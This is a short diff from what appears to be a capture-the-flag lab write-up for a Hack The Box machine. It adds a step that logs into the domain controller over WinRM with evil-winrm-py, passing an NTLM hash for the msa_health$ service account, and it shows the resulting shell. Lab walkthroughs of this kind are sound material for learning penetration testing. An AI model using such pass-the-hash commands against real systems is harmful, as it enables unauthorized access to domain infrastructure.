@@ -314,5 +314,18 @@ This user is in remote management users
 # Access over winrm as `msa_health$`
 
 ```python
+❯❯❯ evil-winrm-py -i dc01.logging.htb -u msa_health$ -H '603fc24ee01a9409f83c9d1d701485c5'
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
 
+[*] Connecting to 'dc01.logging.htb:5985' as 'msa_health$'
+evil-winrm-py PS C:\Users\msa_health$\Documents> whoami
+logging\msa_health$
+evil-winrm-py PS C:\Users\msa_health$\Documents>
 ```
+
+I now have a shell on the domain controller
+
